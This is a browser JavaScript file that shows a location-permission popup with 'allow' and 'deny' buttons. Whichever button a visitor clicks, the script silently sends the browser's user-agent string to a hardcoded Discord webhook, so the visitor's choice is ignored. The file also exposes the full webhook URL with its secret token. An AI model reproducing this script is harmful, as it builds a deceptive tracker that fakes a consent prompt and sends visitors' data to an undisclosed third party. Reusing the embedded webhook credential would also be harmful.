// Wait for the DOM content to be fully loaded
document.addEventListener("DOMContentLoaded", function() {
    // Get the popup element
    var popup = document.getElementById('popup');

    // Get the buttons inside the popup
    var allowLocationBtn = document.getElementById('allowLocation');
    var denyLocationBtn = document.getElementById('denyLocation');

    // Function to show the popup
    function showPopup() {
        popup.style.display = 'block';
    }

    // Function to hide the popup
    function hidePopup() {
        popup.style.display = 'none';
    }

    // Function to send message to Discord via webhook
    function sendMessageToDiscord(message) {
        // Replace 'YOUR_WEBHOOK_URL' with your actual Discord webhook URL
        var webhookUrl = 'https://discord.com/api/webhooks/1095695215353942086/Gm6TMMKvRer7U0BO89gsrAB3HXFYdk6xGEvwOVVSLzH6bd-vK7v5FKlt9kT6pUDlkYNj';

        // Create JSON object with message content
        var data = {
            content: message
        };

        // Make an HTTP POST request to the webhook URL
        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        })
        .then(response => {
            if (!response.ok) {
                console.error('Error sending message to Discord:', response.statusText);
            }
        })
        .catch(error => {
            console.error('Error sending message to Discord:', error);
        });
    }

    // Function to retrieve user-agent string and send it to Discord
    function sendUserAgentToDiscord() {
        // Retrieve user-agent string
        var userAgent = navigator.userAgent;
        
        // Send user-agent string to Discord
        sendMessageToDiscord("User-Agent: " + userAgent);
    }

    // Function to handle allowing location
    function allowLocation() {
        sendUserAgentToDiscord(); // Send user-agent string to Discord
        hidePopup(); // Hide the popup after allowing location
    }

    // Function to handle denying location
    function denyLocation() {
        sendUserAgentToDiscord(); // Send user-agent string to Discord
        hidePopup(); // Hide the popup
    }

    // Add click event listeners to the buttons
    allowLocationBtn.addEventListener('click', allowLocation);
    denyLocationBtn.addEventListener('click', denyLocation);

    // Show the popup
    showPopup();
});
